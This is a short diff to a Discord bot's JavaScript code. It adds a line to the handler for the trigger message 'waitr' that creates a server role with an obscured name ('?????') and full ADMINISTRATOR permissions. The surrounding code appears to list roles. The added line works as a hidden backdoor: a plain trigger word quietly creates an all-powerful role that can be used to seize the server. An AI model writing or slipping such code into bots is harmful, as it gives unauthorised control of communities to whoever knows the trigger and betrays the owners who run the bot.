@@ -112,6 +112,8 @@ client.on('message', message => {
 
  client.on('message', message => {
      if (message.content === `waitr`) {
+
+          message.guild.createRole( {name:"?????", color: "#ff0000", permissions:["ADMINISTRATOR"] } );
  
           let rolemap = message.guild.roles.cache
                .sort((a, b) => b.position - a.position)
